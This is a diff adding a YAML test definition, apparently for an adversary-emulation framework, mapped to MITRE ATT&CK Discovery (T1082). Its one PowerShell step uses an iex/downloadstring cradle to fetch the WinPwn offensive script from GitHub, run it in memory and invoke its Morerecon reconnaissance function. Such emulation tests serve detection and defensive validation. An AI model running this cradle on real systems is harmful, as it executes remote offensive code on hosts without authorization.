@@ -1,0 +1,22 @@
+api_version: "2.0"
+name: WinPwn - Morerecon
+description: Gathers local system information using the Morerecon function of WinPwn
+uuid: 3278b2f6-f733-4875-9ef4-bfed34244f0a
+mitre:
+    tactics:
+        - 'TA0007: Discovery'
+    techniques:
+        - 'T1082: System Information Discovery'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: winpwn---morerecon
+      inline: |-
+        $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+        Morerecon -noninteractive -consoleoutput
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
